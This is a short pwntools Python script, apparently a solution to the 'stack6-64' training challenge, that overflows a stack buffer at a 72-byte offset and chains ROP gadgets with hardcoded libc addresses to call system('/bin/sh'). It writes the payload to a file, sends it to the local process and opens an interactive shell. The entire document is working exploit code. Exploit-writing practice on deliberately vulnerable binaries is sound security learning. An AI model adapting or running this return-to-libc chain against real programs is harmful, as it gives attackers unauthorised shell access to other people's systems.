from pwn import *

context.clear(arch="amd64")

offset_ret = 72
addr_gadget1 = 0x00000000004004ce
addr_gadget2 = 0x00000000004006f3
addr_system = 0x7ffff7a52390
addr_exit = 0x7ffff7a47030
addr_binsh = 0x7ffff7b99d57

exploit_str = flat({offset_ret:p64(addr_gadget1)},p64(addr_gadget2),p64(addr_binsh),p64(addr_system),p64(addr_exit))

exploit_file = open('exploit.in', 'w')
exploit_file.write(exploit_str)

p = process('./stack6-64')
p.sendline(exploit_str)
p.interactive()
